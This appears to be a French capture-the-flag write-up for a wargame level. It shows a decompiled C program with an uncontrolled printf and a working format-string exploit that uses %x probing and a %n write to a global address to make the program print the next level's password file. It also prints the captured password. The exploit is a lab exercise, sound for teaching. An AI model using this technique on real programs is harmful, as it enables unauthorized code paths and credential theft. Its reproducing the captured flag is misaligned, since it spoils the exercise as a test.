# Level 4

Voici le binaire decompile:

```C
#include <stdio.h>
#include <stdlib.h>

uint m;

void p(char *buff)
{
    printf(buff);
    return;
}

void n(void)
{
    char buff[520];

    fgets(buff, 512, stdin);
    p(buff);
    if (m == 16930116)
    {
        system("/bin/cat /home/user/level5/.pass");
    }
    return;
}

void main(void)
{
    n();
    return;
}
```

Nous pouvons donc utiliser exactement la meme methode que l'exericse precedent a ceci pres que nous devons savoir quelle est la position de notre argument dans `printf()`:

```bash
python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520
```

Nous voyons donc notre `61616161` en 12eme position. Nous avons donc juste a modifier notre commande du level3 comme ceci:

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' ; cat) | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Le `%16930112d` nous permet de dire au `%n` d'inserer directement cette valeur a l'adresse precisee
